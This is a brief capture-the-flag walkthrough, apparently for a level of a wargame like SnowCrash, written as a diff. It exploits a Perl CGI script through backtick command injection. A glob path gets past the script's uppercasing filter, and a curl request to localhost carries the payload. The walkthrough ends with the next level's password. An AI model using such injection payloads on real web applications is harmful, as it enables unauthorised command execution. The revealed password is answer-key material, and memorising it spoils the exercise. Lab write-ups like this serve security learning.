@@ -1,0 +1,13 @@
+1. ls -la
+
+2. cat level12.pl
+
+3. analysis => any command injected is transformed into capital letters
+
+4. create dir TMP with a script using getflag
+
+5. curl 'http://localhost:4646/level12.pl?x=`/*/*/TMP/*`'
+
+6. cat /var/log/apache2/error.log
+
+level13: g1qKMiRpXf53AWhDaU7FEkczr
